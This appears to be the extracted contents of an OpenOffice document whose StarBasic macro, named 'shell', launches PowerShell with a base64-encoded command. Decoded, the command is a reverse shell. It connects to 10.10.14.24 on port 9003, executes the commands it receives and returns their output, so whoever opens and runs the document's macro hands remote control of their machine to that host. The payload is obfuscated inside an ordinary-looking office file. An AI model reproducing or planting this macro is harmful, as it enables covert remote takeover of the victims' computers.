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h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shell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01:23:29.668011925</meta:creation-date>
    <dc:date>2024-02-25T01:31:26.714551296</dc:date>
    <meta:editing-duration>PT7M41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ll"/>
</library:library>
</file>

<file path=Basic/Standard/shell.xml><?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE module  PUBLIC '-//OpenOffice.org//DTD OfficeDocument 1.0//EN'  'module.dtd'>
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="shell" script:language="StarBasic" script:moduleType="normal">REM  *****  BASIC  *****

Sub Main
	Shell("cmd /c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgA0ACIALAA5ADAAMAAzACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==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